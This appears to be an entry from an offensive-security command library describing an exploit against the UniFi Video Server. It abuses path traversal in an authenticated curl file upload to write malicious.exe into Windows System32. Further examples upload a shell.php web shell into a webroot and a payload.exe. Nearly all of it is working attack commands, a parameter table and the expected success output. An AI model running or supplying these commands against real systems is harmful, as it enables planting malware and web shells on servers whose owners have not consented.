---
data: >-
  curl -u admin:password -b cookies.txt -F
  "file=@/local/path/malicious.exe;filename=../../../Windows/System32/malicious.exe"
  http://target-ip:8080/upload-endpoint
tags:
  - web-exploit
  - file-upload
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-05T00:00:00Z'
updated_at: '2025-12-14T05:32:10.304Z'
id: 482dbed7-bf40-4bda-ba80-ca2bf882944b
verified: false
validated: true
submitted: true
---
# curl-arbitrary-file-upload-unifi

## Command

```bash
curl -u admin:password -b cookies.txt -F "file=@/local/path/malicious.exe;filename=../../../Windows/System32/malicious.exe" http://target-ip:8080/upload-endpoint
```

## Description

This curl command performs an authenticated file upload to the UniFi Video Server endpoint, exploiting path traversal by specifying a manipulated filename to write the file to an arbitrary location on the Windows filesystem.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u admin:password` | Basic authentication credentials | Yes |
| `-b cookies.txt` | Load session cookies from file | If session-based auth |
| `-F "file=@/local/path/malicious.exe;filename=../../../Windows/System32/malicious.exe"` | Multipart form data with local file and traversed filename | Yes |
| `http://target-ip:8080/upload-endpoint` | Target URL for the upload | Yes |

## Examples

### Basic Usage

```bash
curl -u admin:password -F "file=@shell.php;filename=../webroot/shell.php" http://192.168.1.100:8080/upload
```

### Advanced Usage

```bash
curl -u admin:password --cookie-jar cookies.txt -F "file=@payload.exe;filename=../../../../../C:/Windows/System32/payload.exe" -v http://target:8080/api/upload
```

## Expected Output

HTTP/1.1 200 OK response body indicating successful upload, such as {"status":"ok"} or empty success message. No errors related to invalid filename. Use -v for verbose headers to confirm.

## Related

- [[Related Procedure: Exploit-Path-Traversal-File-Upload-in-UniFi-Video-Server]]
